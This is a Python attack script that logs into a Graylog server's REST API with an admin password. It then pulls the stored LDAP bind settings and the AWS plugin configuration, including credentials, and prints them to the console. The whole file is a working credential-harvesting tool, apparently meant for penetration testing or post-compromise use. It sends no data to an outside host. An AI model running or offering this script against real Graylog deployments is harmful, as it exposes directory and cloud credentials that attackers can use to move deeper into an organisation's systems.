#!/usr/bin/env python3

# Graylog Obtain Stored Credentials via REST API

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import colorama
import getpass
import logging
import requests
import urllib3
from colorama import Fore, Style
from requests.auth import HTTPBasicAuth

colorama.init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%% Functions %%%%%%%%%#

def obtain_ldap_credentials(graylogip):

	ldapurl = "http://" + graylogip + ":9000/api/system/ldap/settings?pretty=true"
	awspluginurl = "http://" + graylogip + \
					":9000/api/system/cluster_config/org.graylog.aws.config.AWSPluginConfiguration" \
					"?pretty=true"
	headers = {'Accept': 'application/json'}
	graylogpass = getpass.getpass(
		Fore.CYAN + Style.BRIGHT + "[!] Enter Graylog Admin Password: " + Style.RESET_ALL)

	try:
		response = requests.get(ldapurl, auth = HTTPBasicAuth('admin', graylogpass))

		if response.status_code == 200 and "DOCTYPE html" not in response.text:

			print(SEPARATOR)
			print(
				Fore.RED + Style.BRIGHT + "[!] Graylog LDAP Settings and Credentials" +
				Style.RESET_ALL)
			print(SEPARATOR + response.text.strip('{}').replace('\n', '\n[!]'))
		else:

			print(SEPARATOR)
			print("[!] Error obtaining Graylog LDAP Settings and Credentials")

	except Exception as e:
		logging.error(e, exc_info = True)

	try:
		response = requests.get(awspluginurl, auth = HTTPBasicAuth('admin', graylogpass),
								headers = headers)

		if response.status_code == 200 and "DOCTYPE html" not in response.text:

			print(SEPARATOR)
			print(
				Fore.RED + Style.BRIGHT + "[!] Graylog AWS Settings and Credentials" +
				Style.RESET_ALL)
			print(SEPARATOR + response.text.strip('{}').replace('\n', '\n[!]'))
			print(SEPARATOR)
		else:

			print(SEPARATOR)
			print("[!] Error obtaining Graylog AWS Settings and Credentials")
			print(SEPARATOR)

	except Exception as e:
		logging.error(e, exc_info = True)

# %%%%%%%%%% The End %%%%%%%%%%#
